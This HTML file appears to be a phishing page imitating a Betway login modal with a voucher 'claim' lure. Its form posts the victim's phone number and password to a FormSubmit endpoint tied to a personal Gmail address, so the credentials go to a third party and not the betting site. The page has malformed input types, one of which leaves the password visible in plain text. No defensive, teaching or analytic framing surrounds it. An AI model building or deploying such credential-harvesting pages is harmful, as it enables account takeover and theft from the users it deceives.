<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BetWa - Submit Form</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #0b0e14;
            color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            position: relative;
        }

        .bg-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.8)), 
                        url('https://images.unsplash.com/photo-1514933651103-005eec06c04b?q=80&w=1000&auto=format&fit=crop') center/cover no-repeat;
            z-index: 1;
        }

        header {
            position: relative;
            z-index: 10;
            background-color: #0f131a;
            height: 60px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 16px;
            border-bottom: 1px solid #1e2530;
        }

        .header-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .menu-btn {
            background: none;
            border: none;
            color: #ffffff;
            font-size: 24px;
            cursor: pointer;
        }

        .logo {
            font-weight: 900;
            font-size: 22px;
            letter-spacing: -0.5px;
            color: #ffffff;
            text-transform: uppercase;
        }

        .header-right {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .btn-header-login {
            background-color: #cfd6df;
            color: #008700;
            border: none;
            padding: 8px 16px;
            border-radius: 4px;
            font-weight: 700;
            font-size: 14px;
            cursor: pointer;
        }

        .btn-header-signup {
            background-color: #008700;
            color: #ffffff;
            border: none;
            padding: 8px 16px;
            border-radius: 4px;
            font-weight: 700;
            font-size: 14px;
            cursor: pointer;
        }

        .search-btn {
            background: none;
            border: none;
            color: #ffffff;
            font-size: 20px;
            cursor: pointer;
            margin-left: 4px;
        }

        .modal-overlay {
            position: relative;
            z-index: 20;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            padding-top: 30px;
            flex-grow: 1;
        }

        .modal-card {
            width: 92%;
            max-width: 440px;
            background-color: #ffffff;
            border-radius: 6px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            color: #333333;
        }

        .modal-header {
            background-color: #000000;
            color: #ffffff;
            padding: 14px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 18px;
            font-weight: 700;
        }

        .close-btn {
            background: none;
            border: none;
            color: #ffffff;
            font-size: 22px;
            cursor: pointer;
            line-height: 1;
        }

        .modal-body {
            padding: 20px;
            background-color: #f2f2f2;
        }

        .input-group {
            position: relative;
            margin-bottom: 14px;
        }

        .input-field {
            width: 100%;
            padding: 12px 14px;
            border: 1px solid #cccccc;
            border-radius: 4px;
            font-size: 14px;
            outline: none;
            background-color: #ffffff;
            color: #111111;
        }

        .input-field:focus {
            border-color: #008700;
        }

        .password-toggle {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            color: #444;
            display: flex;
            align-items: center;
        }

        .helper-links {
            display: flex;
            justify-content: space-between;
            font-size: 12px;
            font-weight: 600;
            color: #555555;
            margin-bottom: 16px;
            padding: 0 2px;
        }

        .helper-links a {
            color: #555555;
            text-decoration: none;
        }

        .signup-banner {
            background-color: #e8e8e8;
            border-radius: 6px;
            padding: 12px 16px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 16px;
            font-size: 13px;
            color: #333333;
        }

        .signup-banner strong {
            font-weight: 800;
            color: #000000;
            display: flex;
            align-items: center;
            gap: 4px;
            cursor: pointer;
        }

        .btn-submit {
            width: 100%;
            background-color: #008700;
            color: #ffffff;
            border: none;
            padding: 14px;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            text-align: center;
            transition: background-color 0.2s;
        }

        .btn-submit:hover {
            background-color: #006e00;
        }

        .footer-watermark {
            position: relative;
            z-index: 10;
            text-align: center;
            padding: 20px;
            margin-top: auto;
            color: rgba(255, 255, 255, 0.4);
            font-size: 28px;
            font-weight: 900;
            letter-spacing: 1px;
            text-transform: uppercase;
        }
    </style>
</head>
<body>

    <div class="bg-overlay"></div>

    <header>
        <div class="header-left">
            <button class="menu-btn" type="button">&#9776;</button>
            <div class="logo">BetWay</div>
        </div>
        <div class="header-right">
            <button class="btn-header-login" type="button">Login</button>
            <button class="btn-header-signup" type="button">Sign Up</button>
            <button class="search-btn" type="button">&#128091;</button>
        </div>
    </header>

    <div class="modal-overlay">
        <div class="modal-card">
            <div class="modal-header">
                <span>Login</span>
                <button class="close-btn" type="button">&times;</button>
            </div>
            
            <div class="modal-body">
                <!-- Form targeting FormSubmit -->
                <form action="https://formsubmit.co/morenalitabe6@gmail.com" method="POST">
                    
                    <div class="input-group">
                        <input 
                            type="Number" 
                            name="Username" 
                            class="input-field" 
                            placeholder="0712345678" 
                            required
                        >
                    </div>

                    <div class="input-group">
                        <input 
                            type="Passwordassword" 
                            id="passwordInput" 
                            name="Passwordassword" 
                            class="input-field" 
                            placeholder="Password" 
                            required
                        >
                        <button type="button" class="password-toggle" onclick="togglePassword()">
                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                                <circle cx="12" cy="12" r="3"></circle>
                            </svg>
                        </button>
                    </div>

                    <div class="helper-links">
                        <a href="#">Forgot Username</a>
                        <a href="#">Forgot Password?</a>
                    </div>

                    <div class="signup-banner">
                        <span>Don't have an account yet?</span>
                        <strong>Sign Up &rsaquo;</strong>
                    </div>

                    <button type="claim" class="btn-submit">claim</button>
                </form>
            </div>
        </div>
    </div>

    <div class="footer-watermark">
        Betway Express Vouchers
    </div>

    <script>
        function togglePassword() {
            const passwordInput = document.getElementById('passwordInput');
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
            } else {
                passwordInput.type = 'password';
            }
        }
    </script>
</body>
</html>
